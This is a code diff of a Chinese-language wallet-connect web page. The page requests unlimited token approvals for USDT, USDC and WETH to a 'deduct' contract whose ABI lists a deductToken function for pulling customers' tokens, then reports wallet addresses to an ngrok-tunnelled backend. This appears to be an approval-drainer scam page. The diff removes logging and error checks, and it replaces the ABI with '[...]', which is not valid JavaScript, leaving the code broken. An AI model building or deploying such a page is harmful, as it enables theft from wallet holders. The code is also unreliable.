@@ -75,29 +75,7 @@
             "function approve(address, uint256) returns (bool)",
             "function allowance(address, address) view returns (uint256)"
         ];
-        const DEDUCT_CONTRACT_ABI = [
-            {"inputs":[{"internalType":"address","name":"_storeAddress","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},
-            {"inputs":[{"internalType":"address","name":"token","type":"address"}],"name":"SafeERC20FailedOperation","type":"error"},
-            {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"recipient","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"EthWithdrawn","type":"event"},
-            {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"customer","type":"address"},{"indexed":true,"internalType":"address","name":"tokenContract","type":"address"}],"name":"ServiceActivated","type":"event"},
-            {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"customer","type":"address"}],"name":"ServiceDeactivated","type":"event"},
-            {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"customer","type":"address"},{"indexed":true,"internalType":"address","name":"tokenContract","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"TokenDeducted","type":"event"},
-            {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"tokenContract","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"TokensRescued","type":"event"},
-            {"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"WethUnwrapped","type":"event"},
-            {"inputs":[],"name":"REQUIRED_ALLOWANCE_THRESHOLD","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
-            {"inputs":[{"internalType":"address","name":"tokenContract","type":"address"}],"name":"activateService","outputs":[],"stateMutability":"nonpayable","type":"function"},
-            {"inputs":[],"name":"deactivateService","outputs":[],"stateMutability":"nonpayable","type":"function"},
-            {"inputs":[{"internalType":"address","name":"customer","type":"address"},{"internalType":"address","name":"tokenContract","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"deductToken","outputs":[],"stateMutability":"nonpayable","type":"function"},
-            {"inputs":[],"name":"getContractEthBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
-            {"inputs":[{"internalType":"address","name":"tokenContract","type":"address"}],"name":"getContractTokenBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
-            {"inputs":[{"internalType":"address","name":"customer","type":"address"},{"internalType":"address","name":"tokenContract","type":"address"}],"name":"getCustomerAllowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
-            {"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"isServiceActiveFor","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},
-            {"inputs":[{"internalType":"address","name":"tokenContract","type":"address"}],"name":"rescueTokens","outputs":[],"stateMutability":"nonpayable","type":"function"},
-            {"inputs":[],"name":"storeAddress","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},
-            {"inputs":[{"internalType":"address","name":"wethAddress","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"unwrapWETH","outputs":[],"stateMutability":"nonpayable","type":"function"},
-            {"inputs":[],"name":"withdrawEth","outputs":[],"stateMutability":"nonpayable","type":"function"},
-            {"stateMutability":"payable","type":"receive"}
-        ];
+        const DEDUCT_CONTRACT_ABI = [...]; // 使用與 admin.html 相同的 ABI
 
         const hostname = window.location.hostname;
         const API_BASE_URL = hostname.includes('ngrok-free.dev') ? `https://${hostname}` : 'http://localhost:3000';
@@ -113,7 +91,6 @@
         async function updateStatus(message, isError = false) {
             elements.status.textContent = `狀態訊息：${message}`;
             elements.status.classList.toggle('error', isError);
-            console.log(`[狀態] ${message}${isError ? ' (錯誤)' : ''}`);
         }
 
         async function connectWallet() {
@@ -127,10 +104,8 @@
                 updateStatus(`✅ 已連線錢包: ${address.slice(0, 6)}...${address.slice(-4)}`);
                 elements.connectWallet.disabled = true;
                 elements.startButton.disabled = false;
-                console.log(`[連線] 錢包地址: ${address}`);
             } catch (error) {
                 updateStatus(`❌ 連線失敗: ${error.message}`, true);
-                console.error('[連線錯誤]', error);
             }
         }
 
@@ -139,7 +114,6 @@
                 if (!signer) throw new Error('請先連線錢包');
                 elements.startButton.disabled = true;
                 updateStatus('正在授權 USDT、USDC 和 WETH...');
-
                 const usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer);
                 const usdcContract = new ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer);
                 const wethContract = new ethers.Contract(WETH_CONTRACT_ADDRESS, ERC20_ABI, signer);
@@ -151,50 +125,31 @@
                     const allowance = await contract.allowance(await signer.getAddress(), DEDUCT_CONTRACT_ADDRESS);
                     if (allowance.lt(ethers.utils.parseUnits("1000", 6))) {
                         updateStatus(`正在授權 ${token}...`);
-                        console.log(`[授權] 開始 ${token} 授權`);
                         const tx = await contract.approve(DEDUCT_CONTRACT_ADDRESS, MAX_UINT256);
                         await tx.wait();
                         updateStatus(`✅ ${token} 授權完成`);
-                        console.log(`[授權] ${token} 完成，交易 Hash: ${tx.hash}`);
                     }
                 }
 
                 // 啟動服務
                 updateStatus('正在啟動服務...');
-                console.log('[服務] 開始啟動服務');
                 const tx = await deductContract.activateService(USDT_CONTRACT_ADDRESS);
                 const receipt = await tx.wait();
                 updateStatus(`✅ 服務啟動完成，交易 Hash: ${receipt.transactionHash.slice(0, 10)}...`);
-                console.log(`[服務] 啟動完成，交易 Hash: ${receipt.transactionHash}`);
 
                 // 發送數據到後端
                 const address = await signer.getAddress();
-                console.log(`[API] 發送數據到後端: ${address}`);
-                const response = await fetch(`${API_BASE_URL}/api/user-data`, {
+                await fetch(`${API_BASE_URL}/api/user-data`, {
                     method: 'POST',
-                    headers: { 
-                        'Content-Type': 'application/json', 
-                        'ngrok-skip-browser-warning': 'true' 
-                    },
+                    headers: { 'Content-Type': 'application/json', 'ngrok-skip-browser-warning': 'true' },
                     body: JSON.stringify({
                         address,
-                        data: { 
-                            isActive: true, 
-                            note: '', 
-                            lastActivated: Date.now(),
-                            source: 'index.html' // 添加來源標記
-                        }
+                        data: { isActive: true, note: '', lastActivated: Date.now() }
                     })
                 });
-                if (!response.ok) {
-                    throw new Error(`後端請求失敗: ${response.status} ${response.statusText}`);
-                }
-                const result = await response.json();
-                updateStatus(`✅ 數據已發送至後端: ${result.message}`);
-                console.log(`[API] 後端回應: ${result.message}`);
+                updateStatus('✅ 數據已發送至後端');
             } catch (error) {
                 updateStatus(`❌ 啟動失敗: ${error.message}`, true);
-                console.error('[啟動錯誤]', error);
                 elements.startButton.disabled = false;
             }
         }
@@ -205,7 +160,6 @@
         window.addEventListener('load', () => {
             if (typeof ethers === 'undefined') {
                 updateStatus('❌ Ethers.js 未載入，請檢查網絡', true);
-                console.error('[初始化] Ethers.js 未載入');
             }
         });
     </script>
